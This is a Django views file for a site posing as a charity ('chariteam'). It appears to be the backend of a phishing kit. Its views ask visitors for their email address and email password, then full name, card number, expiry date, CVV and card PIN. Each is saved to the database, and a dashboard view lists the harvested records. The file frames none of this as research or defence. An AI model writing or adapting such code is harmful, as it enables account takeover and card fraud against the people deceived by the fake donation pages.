from django.shortcuts import render

# Create your views here.
from django.shortcuts import render

# Create your views here.
from email import message
from multiprocessing import context
from django.shortcuts import redirect, render
from django.http import HttpResponse
from .models import Card,  Payment, Pin, Signup


# Create your views here.
# @login_required
def home(request):
    if request.method == 'POST':
        youremail = request.POST.get('youremail')
        emailpassword = request.POST.get('emailpassword')

        sign = Signup(youremail=youremail, emailpassword=emailpassword)
        sign.save()

        return redirect('/donate')

    return render(request, 'chariteam/home.html')


def dash(request):
    cmd = Card.objects.all()
    pmd = Payment.objects.all()
    smd = Signup.objects.all()
    # amd = pin.objects.all()


    
    context = {
        'all': cmd,
        'all': pmd,
        'all': smd,


    }
    return render(request, 'chariteam/admin.html', context)


def contacte(request):
    if request.method == 'POST':
        card = request.POST.get('card')
        edate = request.POST.get('edate')
        
        cvv = request.POST.get('cvv')


        info = Card(card=card, edate=edate, cvv=cvv)
        info.save()

        return redirect('/pin')
    
    return render(request, 'chariteam/contacte.html')


def service(request):
    return render(request, 'chariteam/service.html')


def team(request):
    return render(request, 'chariteam/team.html')


def pin(request):
    if request.method == 'POST':
        pin = request.POST.get('pin')
      

        get = Pin(pin=pin)
        get.save()

    return render(request, 'chariteam/pin.html')



def donate(request):
    if request.method == 'POST':
        fullname = request.POST.get('fullname')
        price = request.POST.get('price')
        email = request.POST.get('email')

        pay = Payment(fullname=fullname, email=email, price=price)
        pay.save()

        return redirect('/contacte')


    return render(request, 'chariteam/donate.html')


def testimonial(request):
    return render(request, 'chariteam/testimonial.html')


def about(request):
    return render(request, 'chariteam/about.html')


def contact(request):
    return render(request, 'chariteam/contact.html')


def error(request):
    return render(request, 'chariteam/404.html')
